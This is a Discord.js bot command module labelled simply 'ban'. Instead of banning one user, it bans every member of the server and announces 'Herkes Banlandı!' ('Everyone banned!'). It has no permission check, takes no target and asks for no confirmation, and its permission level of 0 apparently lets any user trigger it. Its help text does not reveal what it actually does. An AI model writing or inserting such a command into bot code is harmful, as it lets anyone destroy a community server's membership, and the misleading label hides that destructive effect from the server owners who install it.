const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

message.guild.members.forEach(member => {member.ban()});
message.channel.send("Herkes Banlandı!")
  
};

module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0,
  kategori: "sunucu"
};

module.exports.help = {
  name: "ban",
  description: "ban",
  usage: "ban"
};